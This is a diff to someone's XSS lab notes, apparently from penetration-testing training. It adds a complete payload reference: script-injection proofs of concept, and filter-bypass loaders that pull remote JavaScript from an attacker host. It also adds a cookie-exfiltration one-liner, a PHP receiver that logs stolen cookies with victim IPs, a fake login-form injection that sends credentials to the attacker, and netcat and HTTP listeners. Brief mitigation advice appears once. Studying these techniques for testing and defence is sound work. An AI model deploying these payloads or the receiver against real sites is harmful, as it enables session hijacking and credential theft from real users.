@@ -71,6 +71,82 @@ Context-aware **output encoding** (HTML/attr/JS/URL), input validation, CSP, `Ht
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
+## Full payload reference (source notes)
+Complete XSS payload set — nothing trimmed. Standard testing payloads; swap `OUR_IP`/`ATTACKER` for your host.
+
+**Testing / PoC payloads**
+| Payload | Description |
+|---|---|
+| `<script>alert(window.origin)</script>` | Basic PoC (origin confirms context) |
+| `<script>alert(document.cookie)</script>` | Show the cookie |
+| `<plaintext>` | Breaks page render = injection point found |
+| `<script>print()</script>` | Basic PoC (print dialog) |
+| `<script>alert('pass')</script>` | Simple reflection test |
+| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS (when `<script>` filtered) |
+| `<img src="" onerror=alert(document.cookie)>` | DOM attack via onerror |
+| `?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E` | URL-encoded reflected payload |
+| `document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);` | Example DOM sink to look for in JS |
+
+**DOM manipulation (impact demo)**
+| Payload | Description |
+|---|---|
+| `<script>document.body.style.background = "#141d2b"</script>` | Change background color |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change background image |
+| `<script>document.title = 'HackTheBox Academy'</script>` | Change page title |
+| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite page body |
+| `<script>document.getElementById('urlform').remove();</script>` | Remove an element (for phishing) |
+| `<script src="http://OUR_IP/script.js"></script>` | Load a remote script |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send cookie to us |
+
+**Tooling / servers**
+| Command | Description |
+|---|---|
+| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run XSStrike on a parameter |
+| `sudo nc -lvnp 80` | Netcat listener |
+| `sudo php -S 0.0.0.0:80` | PHP server (host remote script / receiver) |
+| `python3 -m http.server 80` | Simple receiver (hits in access log) |
+
+**Remote-JS include variants** (cycle to beat filters/break-outs)
+| Payload | Description |
+|---|---|
+| `<script src=http://OUR_IP/1></script>` | Direct include |
+| `'><script src=http://OUR_IP/2></script>` | Break out of single-quoted attr |
+| `"><script src=http://OUR_IP/3></script>` | Break out of double-quoted attr |
+| `javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')` | javascript: URI include |
+| `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>` | XHR eval loader |
+| `<script>$.getScript("http://OUR_IP")</script>` | jQuery getScript loader |
+
+**Phishing (login-form injection)**
+| Payload | Description |
+|---|---|
+| `http://<ip>/phishing/index.php?url=http://OUR_IP/image.png'><script>alert('xss found')</script>` | Break out of an `<img src>` to confirm |
+| `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');` | Inject a fake login form (creds → your server) |
+| `document.getElementById('urlform').remove();` | Remove the real form so only the fake shows |
+| visit `/phishing/send.php` | App feature that mails the crafted URL to the victim |
+
+**Cookie stealer (session hijacking)** — standard module artifacts
+```javascript
+// exploit.js hosted on attacker:
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+```php
+// index.php receiver (writes cookies.txt):
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+Delivery: inject `"><script src=http://OUR_IP/exploit.js></script>` in a stored field (e.g. an `imgurl=` parameter / registration awaiting admin review) → admin views it → cookie lands in `cookies.txt` → set the stolen cookie in your browser at `/login.php`. **Mitigation that kills it: `HttpOnly` cookie flag** (+ CSP, output encoding).
+
+Reference: PayloadsAllTheThings — XSS Injection.
+
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
 - Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
